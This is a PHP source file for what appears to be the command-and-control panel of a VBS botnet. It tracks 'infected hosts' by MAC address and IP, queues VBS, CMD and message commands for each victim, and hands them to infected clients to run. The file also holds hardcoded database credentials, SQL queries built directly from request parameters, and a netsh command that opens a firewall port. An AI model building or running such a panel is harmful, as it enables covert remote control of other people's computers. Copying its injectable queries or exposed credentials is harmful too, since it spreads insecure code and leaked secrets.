<!DOCTYPE html>


<html>
	<head>
		<meta charset="utf-8" />
		<title>LIAN1.0.VBS</title>
		<!-- bt框架-->
		<script src="http://www.zduber.com/zdcar2/js/bootstrap.min.js"></script>
		<script src="jquery.js"></script>
		<script src="LIANVBS.js"></script>
		<link href="http://www.zduber.com/zdcar2/css/bootstrap.min.css" rel="stylesheet" />
		<link href="//netdna.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet"/>
		<!-- bt框架End-->
	</head>
	<body onLoad="" id='body'>
		<?php 
			require_once 'mysql.class.php';
			$db = new mysql('121.196.226.94', 'admin', 'xwq198291', "zckj_db");
			if(isset($_GET["mode"])){$mode=$_GET["mode"];}else{$mode="null";}
			echo "<b class='btn btn-info'>模式:".$mode."</b><hr>";
			switch($mode){
				case "jilu":
					if(isset($_GET["mac"])){
						$mac=$_GET["mac"];$ip=getip();$time=date("Y-m-d h:m:s");
						echo $ip."<br>".$time;
						$jl=array('ip'=>$ip,'time'=>$time,'MAC'=>$mac);
						$db->insert("LIANVBS", $jl);
						echo $db->printMessage();	
						echo "<b class='btn btn-danger'>记录写入成功</b>";
					}else{
						echo "<b class='btn btn-danger'>记录写入失败，未获取到MAC。</b>";
					}
				break;
				case "getip":
					echo getip();
				break;
				case "admin":
					$db->select("LIANVBS","*","1");$jl = $db->fetchArray(MYSQL_ASSOC);
					echo "<table class='table table-bordered table-condensed table-hover table-striped text-center' ><td>ID</td><td>MAC</td><td>IP</td><td>TIME</td>";
					foreach($jl as $row){
						echo"<tr>
								<td>".$row["id"]."</td>
								<td>".$row["mac"]."</td>
								<Td>".$row["ip"]."</td>
								<Td>".$row["time"]."</td>
							</tr>";
					}
					echo"</table>";
				break;
				case "HostList":
					$ip=getip();
					$db->select("LIANVBS","mac,count(1) c","1 group by mac");$jl = $db->fetchArray(MYSQL_ASSOC);
					$db->select("HOSTLIST","*","1");$host= $db->fetchArray(MYSQL_ASSOC);
					echo "<input type='button' class='btn btn-success'  id='txt' value='测试' onclick='timer1()'/></br></br>";
					echo "<table class='table table-bordered table-condensed table-hover table-striped text-center'>";
					echo "<caption class='text-center'><h1>已感染主机列表</h1></caption>";
					echo "<tr>
							  <td>序号</td>
							  <td>MAC地址</td>
							  <td>感染时间</td>
							  <td>动态码</td>
							  <td>总访问</td>
							  <td>备注</td>
							  <td>状态</td>
							  <td>操作</td>
						 </tr>";
						$c3=0;
					foreach($host as $row){
						$mac=$row["MAC"];$btid=$mac."bt";
						echo"<tr>
								<td>".++$c3."</td>
								<td><input type='text' class='btn btn-info' name='ip' value=".$row["MAC"]."></td>
								<td>".($row["TIME"])."</td>
								<td><input type='text' class='btn btn-info' name='count' id='".$row["MAC"]."' value=".($row["COUNT"]*1.0)."></td>
								<td>".($row["COUNT"]*1)."</td>
								<td>".$row["TIPS"]."</td>
								<td><input type='button' class='btn btn-warning' value='检测' id='$btid' onclick='SendCode(this,\"$mac\")'/></td>
								<td>
									<input type='button' class='btn btn-warning' value='VBS' onclick='VbsCode(this,\"$mac\")'/>
									<input type='button' class='btn btn-warning' value='CMD'  onclick='CmdCode(this,\"$mac\")'/>
									<input type='button' class='btn btn-warning' value='MSG'  onclick='MsgCode(this,\"$mac\")'/>
								</td>
							</tr>";
							echo "<script>timer1('$mac')</script>";
					}
					if(empty($host)){echo"<tr><td colspan=8><b class='btn btn-danger'>暂无主机</b></td></tr>";}
					echo "</table>";
					
					
					
				break;
				case "ajax":
					$amode=$_POST["amode"];
					switch($amode){
						case"acode":
							$code=$_POST["code"];
							$mac=$_POST["mac"];
							$codes=array('code'=>$code,'mac'=>$mac,'zt'=>0);
							$db->insert("code", $codes);
							echo $db->printMessage();
						break;
						case "online":
							$ip=$_POST["ipAddress"];
							echo $ip;
							$db->select("LIANVBS","count(*) c","mac='$ip'");$jl = $db->fetchArray(MYSQL_ASSOC);
							echo "[c]".$jl[0]["c"]."[/c]";
						break;
						
					}
					
					
				break;
				case "null":
					echo "无参数"."netsh firewall add portopening TCP 8080 MyWebPort";
				break;
				case "first":
					$mac=$_GET["mac"];
					$db->select("HOSTLIST","*","MAC='$mac'");$hostlist = $db->fetchArray(MYSQL_ASSOC);
					/*foreach($hostlist as $row){
						print_r($row);
						echo"\n\n";
					}*/
					if(empty($hostlist)){
						$tips=$_GET["tips"];
						$time=date("Y-m-d h:m:s");
						$info=array('TIPS'=>$tips,'TIME'=>$time,'MAC'=>$mac,'TIME'=>$time);
						print_r($info);
						$db->insert("HOSTLIST", $info);
						echo $db->printMessage();
					}else{
						echo "主机已经存在,数据同步成功，";
					}	
				break;
				case "table":
					echo "<table class='table table-bordered table-condensed table-hover table-striped text-center'>
							 <tr>
								 <td rowspan=3>MAC</td>
								 <td>IP1</td>
								 <td>ZT1</td>
							 </tr>
							 <tr>
								<td>IP2</td>
								<td>ZT2</td>
							 </tr>
							 <tr>
								<td>IP3</td>
								<td>ZT3</td>
							 </tr>
							 
							 <tr>
								 <td rowspan=2>MAC2</td>
								 <td>IP1</td>
								 <td>ZT1</td>
							 </tr>
							 <tr>
								<td>IP2</td>
								<td>ZT2</td>
							 </tr>
						  </table>";
				break;
				case "getcode":
					$mac=$_GET["mac"];
					$db->select("code","*","mac='$mac' and zt=0");$code = $db->fetchArray(MYSQL_ASSOC);
					if(!empty($code)){
						echo "[code]".$code[0]["code"]."[/code][codeid]".$code[0]["id"]."[/codeid]";
					}else{
						$db->select("code","*","mac='$mac' and zt");$code = $db->fetchArray(MYSQL_ASSOC);
						echo"<table class='table table-bordered table-condensed table-hover table-striped text-center'>
								<tr>
									<td>HOST</td>
									<td>CODE</td>
									<td>STATE</td>
								</tr>";
						foreach($code as $row){
							echo "<tr>
									<td>".$row["mac"]."</td>
									<td>".$row["code"]."</td>
									<td>".$row["zt"]."</td>
									
								  </tr>";
						}
						echo "</table>";
					}
				break;
				case "runcode":
					$codeid=$_GET["codeid"];
					$code=array('zt'=>1);
					$db->update("code",$code,"id=$codeid");
					echo $db->printMessage();
					echo "命令执行成功";
				break;
				
				
			
			}
function getip(){
	if(getenv('HTTP_CLIENT_IP')) { 
		$onlineip = getenv('HTTP_CLIENT_IP');
	} elseif(getenv('HTTP_X_FORWARDED_FOR')) { 
		$onlineip = getenv('HTTP_X_FORWARDED_FOR');
	} elseif(getenv('REMOTE_ADDR')) { 
		$onlineip = getenv('REMOTE_ADDR');
	}else { 
		$onlineip = $HTTP_SERVER_VARS['REMOTE_ADDR'];
	 }	
	 return $onlineip;
}		

		?>

	</body>

</html>